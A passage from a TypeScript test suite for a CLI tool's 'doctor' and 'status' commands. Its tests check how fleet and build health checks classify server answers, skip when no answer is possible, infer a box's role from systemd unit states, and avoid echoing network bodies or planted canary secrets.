    expect(r.stdout).not.toMatch(/FAIL fleet: /);
    // The unknown remedy names `ccrc update` too (Stage 4, Task 9 — the second
    // of the two strings spec §8 retargets off `bash deploy/deploy.sh …`).
    expect(r.stdout).toMatch(/remedy: .*ccrc update/);
    expect(r.stdout).not.toMatch(/deploy\.sh/);
    expect(r.code).toBe(0);
  });

  it('warns once, naming both, when NEITHER answer is known', () => {
    const home = healthy('ccrc-doctor-fleet-both-unknown-');
    stubHealth(home, { mode: 'remote', connected: true, build: 'unknown', roster: 'unknown' });
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toContain('build');
    expect(line).toContain('roster');
    expect(r.code).toBe(0);
  });

  it('reads an ABSENT build/roster as unknown, exactly as the wire contract says', () => {
    // shared/api.ts: both fields are optional and "absent reads as 'unknown'".
    // One reader per field — an older server that omits them must not arrive as
    // a fourth state here. The SENTENCE is asserted, not just the class: "no
    // stamp has reached the server" and "the server said something I do not
    // recognise" are the same WARN and two entirely different diagnoses, and
    // this is the live shape today (the deployed server predates the field).
    const home = healthy('ccrc-doctor-fleet-absent-fields-');
    stubHealth(home, { mode: 'remote', connected: true });
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toContain('build: unknown');
    expect(line).toContain('roster: unknown');
    expect(line).not.toMatch(/does not recognise/);
    expect(r.code).toBe(0);
  });

  it('says so, rather than reporting a fleet, when ccrc\'s own readers are not loaded', () => {
    // The check calls `_box_server_addr`/`_box_health`, which live in `ccrc`
    // itself — this file is only ever sourced BY ccrc. Sourced by anything
    // else, the check must say that in a verdict line rather than assume, the
    // same way `_check_wrappers` reports a missing ccrc-wrapper-shape.
    // CONTAINED LIKE `roleFor` BELOW, and not because it needs to be today:
    // the guard under test returns before the check reads anything, so this
    // passed the real HOME and the real PATH straight into a `_check_fleet`
    // that never used them. The moment the check grows one step AHEAD of that
    // guard, this test reads the live `~/.ccrc/ccrc.env` and curls the
    // production server from a unit test. A HOME that cannot exist removes the
    // only file that could name a server, and a PATH of the same non-existent
    // directory removes `curl` — this file resolves no binary at source time
    // (its own header's "no PATH lookups" rule), so nothing legitimate needs
    // either.
    const nowhere = join(REPO, 'no-such-home-for-check-fleet');
    const r = spawnSync(BASH, ['-c', `set -uo pipefail; . ${shq(CHECKS_SRC)}; _check_fleet`],
      { encoding: 'utf8', env: { HOME: nowhere, PATH: nowhere, LC_ALL: 'C' } });
    expect(r.stdout).toMatch(/^FAIL fleet: ccrc's own fleet readers are not loaded/m);
    expect(r.stdout).toMatch(/^ {2}remedy: this is a bug in ccrc/m);
    expect(r.status).toBe(1);
  });

  it('warns rather than fails when the server is unreachable — that is a different problem', () => {
    const home = healthy('ccrc-doctor-fleet-unreachable-');
    stubHealthUnreachable(home);
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toMatch(/did not answer/);
    expect(line).toContain('7');                 // curl's own exit code, named
    expect(line).not.toMatch(/skewed|divergent/);
    expect(r.code).toBe(0);
  });

  it('warns on an HTTP error, and says which one', () => {
    // A 500 is not a disagreement and not an unreachable box: the server is
    // there and answering, and something inside it is broken.
    const home = healthy('ccrc-doctor-fleet-500-');
    stubHealth(home, '', 500);
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toContain('500');
    expect(line).not.toMatch(/did not answer/);  // that is the unreachable sentence
    expect(r.code).toBe(0);
  });

  it('SKIPS — never "read the server\'s log" — when the session gate refuses it (D-150)', () => {
    // `/api/fleet/health` is GATED on purpose: it publishes roster digests,
    // build stamps and divergence, and exempting it to spare a diagnostic would
    // widen the tailnet surface for convenience. So on an armed box this call
    // answers 401, which is BOTH PARTIES BEHAVING CORRECTLY — and it used to
    // land in the generic HTTP-error arm, whose remedy is "read the server's own
    // log", sending an operator to a journal where nothing is wrong. On exactly
    // the box the runbook tells them to run doctor on right after arming.
    const home = healthy('ccrc-doctor-fleet-gated-');
    stubHealth(home, '{"ok":false,"error":"unauthenticated","verdict":"no-session"}', 401);
    const r = runDoctor(home);
    const line = r.stdout.split('\n').find((l) => l.startsWith('SKIP fleet: ')) ?? '';
    expect(line, r.stdout).not.toBe('');
    expect(line).toMatch(/session gate is ARMED/);
    // The two sentences the old wording got wrong, pinned as absences — and the
    // SKIP contract's own half: no remedy line under it, because the only
    // honest "remedy" would be "turn the gate off", which is not advice.
    expect(line).not.toMatch(/HTTP 401/);
    expect(r.stdout).not.toMatch(/journalctl/);
    expect(lineFor(r.stdout, 'fleet'), 'a SKIP is not a PASS/WARN/FAIL').toBeUndefined();
    // THE COST IS STATED RATHER THAN GLOSSED: silence here is not evidence that
    // the two boxes agree, and the line has to say so or it becomes the reason
    // a skew goes unnoticed.
    expect(line).toMatch(/NOT being measured/);
    expect(line).toContain('ccrc version');
    expect(r.code).toBe(0);
  });

  it('a 401 that is NOT this server\'s refusal stays the generic HTTP error', () => {
    // A reverse proxy or a captive portal in front of the address answers 401
    // too, and telling that operator "your session gate refused it" would be the
    // same class of wrong answer D-150 exists to stop. The discriminator is this
    // server's own refusal envelope, not the status code.
    const home = healthy('ccrc-doctor-fleet-proxy401-');
    stubHealth(home, '<html>Proxy Authentication Required</html>', 401);
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toContain('401');
    expect(line).not.toMatch(/session gate/);
    expect(r.code).toBe(0);
  });

  it('classifies the refusal WITHOUT quoting a byte of it', () => {
    // `_box_health`'s standing rule — nothing from the body is ever printed —
    // now applies to a body this code READS rather than merely classifies, so
    // it is measured rather than assumed.
    const home = healthy('ccrc-doctor-fleet-gated-quiet-');
    stubHealth(home,
      '{"ok":false,"error":"unauthenticated","verdict":"no-session","canary":"PLANTED-BODY-7f2a"}', 401);
    const r = runDoctor(home);
    expect(r.stdout).not.toContain('PLANTED-BODY-7f2a');
    expect(r.stderr).not.toContain('PLANTED-BODY-7f2a');
  });

  it('warns when the answer is not the health JSON at all', () => {
    // The measured shape of a reverse proxy or a captive portal answering 200
    // with an HTML page.
    const home = healthy('ccrc-doctor-fleet-notjson-');
    stubHealth(home, '<html>hello</html>');
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toMatch(/not the health JSON/);
    expect(r.code).toBe(0);
  });

  it('never echoes the body back — an unrecognised answer is CLASSIFIED, not quoted', () => {
    // doctor's output is what an operator pastes into a ticket, and the body
    // comes off a network. A canary in the answer must not reach the terminal.
    const home = healthy('ccrc-doctor-fleet-canary-');
    stubHealth(home, { mode: 'remote', connected: true, build: 'ccrc-canary-6f21b', roster: 'agreed' });
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'fleet')).toMatch(/^WARN fleet: /);
    expect(r.stdout).not.toContain('ccrc-canary-6f21b');
    expect(r.stderr).not.toContain('ccrc-canary-6f21b');
  });

  it('does not read a value that merely STRINGIFIES to a token as that token', () => {
    // `["agreed"]` renders as exactly "agreed". The classifier compares VALUES
    // against the vocabulary rather than their renderings, so this is an answer
    // the check does not recognise — and emphatically not an agreement.
    // Measured: without that strictness the whole body is passed through as a
    // string and this box reports PASS on an answer nobody wrote.
    const home = healthy('ccrc-doctor-fleet-stringy-');
    stubHealth(home, { mode: 'remote', connected: true, build: ['agreed'], roster: 'agreed' });
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toMatch(/does not recognise/);
    expect(r.stdout).not.toMatch(/PASS fleet: /);
  });

  it('warns, rather than passing, when the server says the fleet host is not connected', () => {
    // `agreed` computed over a dead link describes the last contact, not now.
    // Passing on it would report a fact nobody currently measures.
    const home = healthy('ccrc-doctor-fleet-down-');
    stubHealth(home, { mode: 'remote', connected: false, downSince: 1_755_000_000_000, build: 'agreed', roster: 'agreed' });
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toMatch(/is not currently connected/);
    expect(r.stdout).not.toMatch(/PASS fleet: /);
    expect(r.code).toBe(0);
  });

  // AN ANSWER THIS CHECK DID NOT UNDERSTAND MUST NOT BECOME A CLAIM THAT THE
  // OPPOSITE IS TRUE. `connected` is required on the wire (shared/api.ts:1926),
  // so each of these is a malformed answer — and each used to PASS with the
  // words "in remote mode, connected", which is the strongest claim this check
  // can make, made about the one field the answer did not state. The
  // classifier has always emitted `?` here; the verdict was narrowing it.
  it.each([
    ['absent', { mode: 'remote', build: 'agreed', roster: 'agreed' }],
    ['a non-boolean word', { mode: 'remote', connected: 'yes', build: 'agreed', roster: 'agreed' }],
    ['null', { mode: 'remote', connected: null, build: 'agreed', roster: 'agreed' }],
    ['the STRING "false"', { mode: 'remote', connected: 'false', build: 'agreed', roster: 'agreed' }],
  ] as const)('warns when `connected` is %s — it must never pass as "connected"', (_what, body) => {
    const home = healthy(`ccrc-doctor-fleet-conn-${_what.replace(/\W+/g, '-')}-`);
    stubHealth(home, body as Health);
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: /);
    expect(line).toMatch(/did not say whether it is in contact/);
    expect(r.stdout).not.toMatch(/PASS fleet: /);
    // …and specifically not the OTHER link sentence: "the fleet host is down"
    // and "this answer did not say" are two different things to go and look at.
    expect(line).not.toMatch(/is not currently connected/);
    expect(r.code).toBe(0);
  });

  it('warns when the server does not say which mode it is in', () => {
    const home = healthy('ccrc-doctor-fleet-nomode-');
    stubHealth(home, { connected: true, build: 'agreed', roster: 'agreed' });
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'fleet')).toMatch(/^WARN fleet: .*mode/);
    expect(r.code).toBe(0);
  });

  it('SKIPS in local mode — one box cannot disagree with itself', () => {
    // Not a PASS. Nothing was compared, and a run that reported agreement it
    // never measured is the overloaded-null defect this codebase bans. The
    // check prints its SKIP line and no verdict; the summary counts it as
    // skipped, so the number of verdicts really is the number of measurements.
    const home = healthy('ccrc-doctor-fleet-local-');
    stubHealth(home, { mode: 'local', connected: true, build: 'unknown', roster: 'unknown' });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP fleet: .*local mode/m);
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) fleet: /m);
    expect(r.stdout).toMatch(
      new RegExp(`^summary: \\d+ checks \\(${1 + HEALTHY_SKIPS} skipped\\)`, 'm'));
    expect(r.code).toBe(0);
  });

  it('SKIPS when this box has no server address at all, and says how to give it one', () => {
    // The measured state of the FLEET host: it has ~/.ccrc/agent.env and no
    // ccrc.env, so it does not know where the server is. That is not a fault
    // and not an agreement — it is a check that could not run.
    const home = healthy('ccrc-doctor-fleet-noaddr-');
    rmSync(join(home, '.ccrc', 'ccrc.env'), { force: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP fleet: this box has no server address/m);
    expect(r.stdout).toMatch(/CCRC_ADDR/);
    expect(curlCalls(home)).toEqual([]);          // nothing was asked
    expect(r.code).toBe(0);
  });

  it('SKIPS a half-configured address rather than inventing the missing half', () => {
    // The port's default lives in server/src/config.ts. Copying it here would
    // be one value declared twice in two languages — and guessing it wrong
    // would produce a confident answer about a box nobody asked.
    const home = healthy('ccrc-doctor-fleet-halfaddr-');
    writeCcrcEnv(home, 'CCRC_HOST=ccrc-fixture.invalid\n');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP fleet: .*CCRC_PORT/m);
    expect(curlCalls(home)).toEqual([]);
    expect(r.code).toBe(0);
  });

  it('SKIPS an address that is not an address, and never echoes it back', () => {
    const home = healthy('ccrc-doctor-fleet-badaddr-');
    writeCcrcEnv(home, 'CCRC_HOST=not a host\nCCRC_PORT=99999999\n');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP fleet: /m);
    expect(r.stdout).not.toContain('99999999');
    expect(curlCalls(home)).toEqual([]);
  });

  it.skipIf(process.getuid?.() === 0)(
    'a ccrc.env it cannot READ is its own answer, not "none configured"', () => {
      // A mode fix and "this box was never given a server address" are two
      // different things to do about it — and without the guard the read fails,
      // bash's own error lands on stderr, and every key comes back empty, which
      // is indistinguishable from a file that declares nothing.
      const home = healthy('ccrc-doctor-fleet-envunreadable-');
      chmodSync(join(home, '.ccrc', 'ccrc.env'), 0o000);
      const r = runDoctor(home);
      expect(r.stdout).toMatch(/^SKIP fleet: .*cannot be read/m);
      expect(r.stdout).not.toMatch(/no server address/);
      expect(r.stderr).toBe('');
    });

  it('a ccrc.env that is not a regular file is its own answer too', () => {
    const home = healthy('ccrc-doctor-fleet-envdir-');
    rmSync(join(home, '.ccrc', 'ccrc.env'), { force: true });
    mkdirSync(join(home, '.ccrc', 'ccrc.env'), { recursive: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP fleet: .*is not a regular file/m);
    expect(r.stdout).not.toMatch(/no server address/);
  });

  it('takes CCRC_ADDR ahead of the config file — notify.sh\'s own seam', () => {
    const home = healthy('ccrc-doctor-fleet-envaddr-');
    const r = runDoctor(home, ['doctor'], { CCRC_ADDR: 'other.invalid:9999' });
    expect(curlCalls(home).join('\n')).toContain('http://other.invalid:9999/api/fleet/health');
    expect(curlCalls(home).join('\n')).not.toContain(FIXTURE_ADDR);
    expect(lineFor(r.stdout, 'fleet')).toContain('other.invalid:9999');
  });

  it('reads ONLY the two keys it needs out of ccrc.env — the file also holds tokens', () => {
    // `~/.ccrc/ccrc.env` carries CCRC_VAPID_PRIVATE, CCRC_AGENT_TOKEN and a
    // Hetzner token. The reader takes two keys by name and must never print,
    // export or log another line of it.
    const home = healthy('ccrc-doctor-fleet-envsecrets-');
    writeCcrcEnv(home, [
      '# comment',
      'CCRC_AGENT_TOKEN=ccrc-canary-token-9a13c',
      'CCRC_HOST=ccrc-fixture.invalid',
      'CCRC_VAPID_PRIVATE=ccrc-canary-vapid-4b7e2',
      'CCRC_PORT=7788',
      '',
    ].join('\n'));
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'fleet')).toMatch(/^PASS fleet: /);
    expect(r.stdout).not.toContain('ccrc-canary-token-9a13c');
    expect(r.stdout).not.toContain('ccrc-canary-vapid-4b7e2');
    expect(r.stderr).not.toContain('ccrc-canary-token-9a13c');
    expect(r.stderr).not.toContain('ccrc-canary-vapid-4b7e2');
    // …and nothing from that file may leak into the child's environment either.
    expect(curlCalls(home).join('\n')).not.toContain('ccrc-canary');
  });

  it('reads an INDENTED key, which is what its own config file\'s parser accepts', () => {
    // systemd's `EnvironmentFile=` skips leading whitespace, and ccrc.env's
    // only real consumer is systemd. A reader stricter than the parser it
    // claims to copy answers "no address" for a file that configures the box
    // perfectly well — a safe failure, but the wrong answer.
    const home = healthy('ccrc-doctor-fleet-indented-');
    writeCcrcEnv(home, '  CCRC_HOST=ccrc-fixture.invalid\n\tCCRC_PORT=7788\n');
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'fleet')).toMatch(/^PASS fleet: /);
    expect(curlCalls(home).join('\n')).toContain(`http://${FIXTURE_ADDR}/api/fleet/health`);
  });

  it('and does NOT read a key systemd would REFUSE — the parity runs in one direction only', () => {
    // The other side of the test above, and the reason the reader trims a
    // named three-character set rather than `[[:space:]]`. POSIX's space class
    // also contains vertical tab and form feed; systemd's whitespace is space,
    // tab, CR (and the newline that ends the line). So `\vCCRC_HOST=…` is a
    // line systemd does NOT turn into an environment variable — and a reader
    // that skips the \v anyway would answer with an address the box is not
    // actually configured with, then probe it and report on a fleet nobody
    // asked about.
    //
    // That direction is the one that matters: the reader is a deliberate
    // SUBSET of systemd's parser, and its own comment justifies the subset by
    // the failure being one-directional (a form it misses yields no address,
    // which SKIPS with a detail). A form it reads that systemd does not
    // breaks exactly that argument.
    const home = healthy('ccrc-doctor-fleet-vtab-');
    writeCcrcEnv(home, '\vCCRC_HOST=ccrc-fixture.invalid\nCCRC_PORT=7788\n');
    const r = runDoctor(home);
    // `lineFor` finds a VERDICT line; this check answers with a SKIP, which is
    // deliberately not one (see the runner's fourth-outcome contract).
    expect(r.stdout).toMatch(/^SKIP fleet: .*declares CCRC_PORT but no CCRC_HOST/m);
    expect(r.stdout, 'an address systemd never set was reported as one').not.toContain('ccrc-fixture.invalid');
    expect(curlCalls(home), 'an address systemd never set was probed anyway').toEqual([]);
  });

  it('bounds the request, and the bound is overridable the way verify-service.sh\'s are', () => {
    // A route that hangs must not hang doctor. The knob exists so a test need
    // not wait out a production timeout — `deploy/verify-service.sh`'s
    // `CCRC_VERIFY_*` model, and `CCRC_DOCTOR_GH_TIMEOUT`'s own precedent.
    const home = healthy('ccrc-doctor-fleet-timeout-');
    runDoctor(home, ['doctor'], { CCRC_HEALTH_TIMEOUT: '3' });
    expect(curlCalls(home).join('\n')).toMatch(/--max-time 3\b/);
  });

  it('warns when curl is not on PATH — the check could not run, and says so', () => {
    const home = healthy('ccrc-doctor-fleet-nocurl-');
    unstub(home, 'curl');
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'fleet') ?? '';
    expect(line).toMatch(/^WARN fleet: curl is not on PATH/);
    expect(r.code).toBe(0);
  });

  it('says node is missing in its own words rather than blaming the server', () => {
    // A check must not fail for a reason that belongs to another check.
    const home = healthy('ccrc-doctor-fleet-nonode-');
    unstub(home, 'node');
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'fleet')).toMatch(/^WARN fleet: node is not on PATH/);
  });

  it('the three-state vocabulary is the one shared/api.ts declares', () => {
    // The bash check cannot import the TypeScript union, so it carries the
    // tokens as literals — and this is the mechanism that stops the copy
    // drifting, the same text-scan discipline single-definition.test.ts uses.
    const api = readFileSync(join(REPO, 'shared', 'api.ts'), 'utf8');
    const build = /export type BuildAgreement = ([^;]+);/.exec(api)?.[1] ?? '';
    const roster = /roster\?: ([^;]+);/.exec(api)?.[1] ?? '';
    const tokens = (s: string): string[] => (s.match(/'([a-z]+)'/g) ?? []).map((t) => t.slice(1, -1));
    const wanted = [...new Set([...tokens(build), ...tokens(roster)])];
    expect(wanted.sort()).toEqual(['agreed', 'divergent', 'skewed', 'unknown']);
    const checks = readFileSync(CCRC_SRC, 'utf8');
    for (const t of wanted) expect(checks, `ccrc does not know the token "${t}"`).toContain(`"${t}"`);
  });
});


// ── the running build against the stamp (Stage 4, Task 9 — spec §8) ───────
// `~/.ccrc/build.json` says what is INSTALLED; the server process reports what
// it BOOTED with on GET /health. Between an install/update and a restart the
// two legitimately differ, and until this check existed nothing on the box
// said so — the hole `ccrc install`'s own transcript recorded. The check asks
// this box's OWN server (the address `_box_server_addr` reads) and compares
// shas; it never prints a byte the network sent.

describe('ccrc doctor: build', () => {
  it('passes when the running server reports the stamped sha, naming the short sha', () => {
    const home = healthy('ccrc-doctor-build-agreed-');
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'build');
    expect(line, r.stdout).toMatch(/^PASS build: /);
    // The measurement, never the bare word "ok": the short sha it compared.
    expect(line).toContain(HEALTHY_SHA.slice(0, 12));
    expect(r.code).toBe(0);
  });

  it('fails on a mismatch — the process is stale — and the remedy is the restart', () => {
    const home = healthy('ccrc-doctor-build-stale-');
    stubBuildHealth(home, healthBodyFor('ccrc-canary-running-9d4f'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL build: /m);
    // The remedy has to be a command THIS box has. `systemctl --user restart`
    // on macOS is a second dead end printed at the exact moment somebody is
    // already debugging — hence `_dr_restart_hint`, and hence two spellings
    // here.
    expect(r.stdout).toMatch(process.platform === 'darwin'
      ? /remedy: .*launchctl kickstart -k gui\/\d+\/app\.ccrc\.ccrc/
      : /remedy: .*systemctl --user restart ccrc\.service/);
    // The stamp's sha is local and named; the sha off the NETWORK is not
    // echoed — `_box_health`'s standing nothing-from-the-body rule.
    expect(r.stdout).toContain(HEALTHY_SHA.slice(0, 12));
    expect(r.stdout).not.toContain('ccrc-canary-running-9d4f');
    expect(r.code).toBe(1);
  });

  it('SKIPS when this box has no server address — a fleet box has no server to ask', () => {
    const home = healthy('ccrc-doctor-build-noaddr-');
    rmSync(join(home, '.ccrc', 'ccrc.env'), { force: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP build: this box has no server address/m);
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) build: /m);
    expect(r.code).toBe(0);
  });

  it('SKIPS when nothing answers — a stopped server is the services check\'s finding, not a mismatch', () => {
    const home = healthy('ccrc-doctor-build-unreachable-');
    stubHealthUnreachable(home);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP build: no server answered/m);
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) build: /m);
    expect(r.code).toBe(0);
  });

  it('SKIPS a gated 401 saying the GATE answered, not the build (D-150)', () => {
    // The discriminator is this server's own refusal envelope, `_box_health`'s
    // D-150 rule — a bare 401 (a proxy) must not read as the session gate.
    const home = healthy('ccrc-doctor-build-gated-');
    stubBuildHealth(home, '{"ok":false,"error":"unauthenticated","verdict":"no-session"}', 401);
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('SKIP build: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/gate answered/i);
    expect(lines[i]).toMatch(/not the build/i);
    // The SKIP contract: no verdict line, and NO remedy under it.
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) build: /m);
    expect(lines[i + 1] ?? '').not.toMatch(/^ {2}remedy: /);
    expect(r.code).toBe(0);
  });

  it('SKIPS an unstamped box — nothing to compare the running server against', () => {
    const home = healthy('ccrc-doctor-build-unstamped-');
    rmSync(join(home, '.ccrc', 'build.json'), { force: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP build: this box has no build stamp/m);
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) build: /m);
    // Nothing was asked: the one curl this fixture logs is the fleet check's.
    expect(curlCalls(home).filter((c) => !c.includes('/api/fleet/health'))).toEqual([]);
    expect(r.code).toBe(0);
  });

  it('a running server that answers something else entirely is a WARN, not a verdict about the build', () => {
    // A reverse proxy or captive portal answering 200 HTML — classified,
    // never quoted (the same rule as the fleet check's canary test).
    const home = healthy('ccrc-doctor-build-notjson-');
    stubBuildHealth(home, '<html>ccrc-canary-body-3c1e</html>');
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'build')).toMatch(/^WARN build: /);
    expect(r.stdout).not.toContain('ccrc-canary-body-3c1e');
    expect(r.code).toBe(0);
  });
});


// ── ccrc status ───────────────────────────────────────────────────────────
// Read-only, one fact per line, exit 0. It answers the question doctor cannot:
// not "is this box fit to work" but "what IS this box, and does it agree with
// the other one". Everything it prints is measured here and nothing is judged —
// a skewed fleet is doctor's FAIL, and status's plain line of fact.

describe('ccrc status', () => {
  /** `healthy()` plus what status (and only status) reads: a real `jq` for the
   *  build stamp, a systemctl to ask about the two units, and a registry. */
  function statusBox(prefix: string): string {
    const home = healthy(prefix);
    unstub(home, 'jq');                 // healthy()'s jq is a presence stub
    linkReal(home, 'jq');               // …and the stamp reader needs a real one
    stubSystemctl(home);
    // BOTH unit states are stated here, and neither is inherited: `healthy()`
    // plants an ACTIVE ccrc.service for the `services` check, and status's own
    // fixture is a FLEET HOST (the agent running, the server not). Leaving
    // ccrc.service to the inherited value would silently turn every assertion
    // below into one about a different box.
    writeFileSync(join(home, 'fixture-unit-ccrc.service'), 'inactive\n');
    writeFileSync(join(home, 'fixture-unit-ccrc-agent.service'), 'active\n');
    writeSessions(home, 3);
    writeFileSync(join(home, '.ccrc', 'build.json'),
      JSON.stringify({ sha: 'abc123', ref: 'main', builtAt: '2026-08-15T00:00:00Z', dirty: false }));
    return home;
  }

  it('prints this box\'s build stamp and the fleet answer, one fact per line', () => {
    const home = statusBox('ccrc-status-ok-');
    const r = runDoctor(home, ['status']);
    expect(r.code).toBe(0);
    expect(r.stdout).toMatch(/build: +abc123 \(main\)/);
    expect(r.stdout).toMatch(/fleet: +agreed/);
    expect(r.stderr).toBe('');
  });

  it('prints a version line iff the stamp carries one (Stage 4, Task 1)', () => {
    // The release tag is an additive fifth stamp field: absent on every
    // dev-deployed box (statusBox's stamp above omits it — no line), present
    // after a release install/update — its own fact line, in status's
    // one-fact-per-line register.
    const home = statusBox('ccrc-status-version-');
    expect(runDoctor(home, ['status']).stdout).not.toMatch(/^version:/m);
    writeFileSync(join(home, '.ccrc', 'build.json'),
      JSON.stringify({ sha: 'abc123', ref: 'main', builtAt: '2026-08-15T00:00:00Z', dirty: false, version: 'v1.2.3' }));
    const out = runDoctor(home, ['status']).stdout;
    expect(out).toMatch(/^version: +v1\.2\.3$/m);
    expect(out).toMatch(/build: +abc123 \(main\)/);
  });

  it('prints the two services\' state and a session count', () => {
    const home = statusBox('ccrc-status-services-');
    const out = runDoctor(home, ['status']).stdout;
    expect(out).toMatch(/services: +.*ccrc\.service inactive/);
    expect(out).toMatch(/ccrc-agent\.service active/);
    expect(out).toMatch(/sessions: +3\b/);
  });

  // ── the role, and the word "inferred" that has to travel with it ────────
  // Nothing on a box records its own role (D-73). The two unit states are the
  // only evidence there is, so status reports the inference and SAYS it is one
  // — a flat `role: fleet host` would be this tool asserting a fact no box ever
  // declared, on evidence that is one `systemctl stop` away from changing.
  it.each([
    ['fleet host', { ccrc: 'inactive', agent: 'active' }],
    ['server', { ccrc: 'active', agent: 'inactive' }],
    ['server AND fleet host', { ccrc: 'active', agent: 'active' }],
    ['neither', { ccrc: 'inactive', agent: 'inactive' }],
  ] as const)('infers "%s" from the units, and says that it inferred it', (role, units) => {
    const home = statusBox(`ccrc-status-role-${role.replace(/\W+/g, '-')}-`);
    for (const [u, state] of [['ccrc.service', units.ccrc], ['ccrc-agent.service', units.agent]] as const) {
      writeFileSync(join(home, `fixture-unit-${u}`), `${state}\n`);
    }
    const out = runDoctor(home, ['status']).stdout;
    const line = out.split('\n').find((l) => l.startsWith('role:')) ?? '';
    expect(line).toContain(role);
    expect(line).toMatch(/inferred|not declared/);
  });

  it('says the role is unknown, not "neither", when the units could not be asked at all', () => {
    // "I could not tell" and "no unit is running" are two different answers,
    // and inferring the second from no evidence is the thing this line exists
    // not to do.
    const home = statusBox('ccrc-status-role-nosystemctl-');
    unstubManager(home);
    const out = runDoctor(home, ['status']).stdout;
    const line = out.split('\n').find((l) => l.startsWith('role:')) ?? '';
    expect(line).toMatch(/unknown/);
    expect(line).not.toMatch(/neither/);
    expect(out).toMatch(/services: +.*ccrc\.service unknown/);
  });

  it('says unknown, not "neither", when only ONE unit could be asked — end to end', () => {
    // The defect the sourced table below isolates, reached the way an operator
    // reaches it: an EMPTY answer from `systemctl is-active` for one unit
    // (which the fixture systemctl produces from an empty fixture file, and a
    // real one produces on a bus it cannot reach) and a plain `inactive` for
    // the other. Partial evidence used to fall straight through to "no ccrc
    // unit is active here".
    const home = statusBox('ccrc-status-role-halfasked-');
    writeFileSync(join(home, 'fixture-unit-ccrc.service'), '\n');
    writeFileSync(join(home, 'fixture-unit-ccrc-agent.service'), 'inactive\n');
    const out = runDoctor(home, ['status']).stdout;
    const line = out.split('\n').find((l) => l.startsWith('role:')) ?? '';
    expect(line, 'a role inferred from a unit nobody could ask').not.toMatch(/neither/);
    expect(line).toMatch(/unknown/);
    expect(out).toMatch(/services: +.*ccrc\.service unknown/);
  });

  // ── _box_role, every combination of what the two units can say ───────────
  // Called DIRECTLY, by sourcing `ccrc` and setting `BOX_UNITS` — the file
  // carries a source guard for exactly this, and it is the only way to reach
  // all nine states without nine fixtures. The e2e cases above prove the
  // function is wired to a real measurement; this proves what it does with it.
  //
  // THE RULE: no answer may state something no unit was asked about. "unknown"
  // is a state a unit really reaches (no systemctl, no bus, an empty answer),
  // and it is NOT "inactive" — the same distinction this whole file keeps
  // between a check that failed and a check that could not run.
  describe('_box_role never asserts a state it did not measure', () => {
    // An EMPTY fixture HOME made at collection: `_box_role` reads only the preset BOX_UNITS array, so nothing is put in
    // it; the env is contained so a stray systemctl, curl or ssh answers a poison (wave 17, D-5322).
    const roleHome = mkTmp('ccrc-doctor-boxrole-');
    const roleFor = (ccrc: string, agent: string): string => {
      const r = spawnSync(BASH, ['-c',
        `source "${CCRC_SRC}"; BOX_UNITS=(${ccrc} ${agent}); _box_role; echo`],
        { encoding: 'utf8', env: ccrcContainedEnv(roleHome, process.env, { managers: true, curl: 'poison' }) });
      expect(r.status, `_box_role exited ${r.status}\n${r.stderr}`).toBe(0);
      expect(r.stderr).toBe('');
      return r.stdout.trim();
    };

    it.each([
      ['active', 'active', 'server AND fleet host'],
      ['active', 'inactive', 'server'],
      ['inactive', 'active', 'fleet host'],
      ['inactive', 'inactive', 'neither'],
    ] as const)('(%s, %s) — both units answered, so the inference is stated: %s', (c, a, want) => {
      const line = roleFor(c, a);
      expect(line).toContain(want);
      expect(line, 'the word that makes it an inference rather than a fact').toMatch(/inferred|not declared/);
    });

    it('(active, inactive) is "server" and not the single-box answer', () => {
      expect(roleFor('active', 'inactive')).not.toContain('fleet host');
    });

    it.each([
      ['unknown', 'inactive', 'ccrc.service'],
      ['inactive', 'unknown', 'ccrc-agent.service'],
      ['unknown', 'unknown', 'ccrc.service'],
    ] as const)('(%s, %s) is UNKNOWN — one unmeasured unit is enough to withhold "neither"', (c, a, names) => {
      // The verified defect: the `elif` that answers "unknown" required BOTH
      // units to be unknown, so a box where one unit could not be asked and
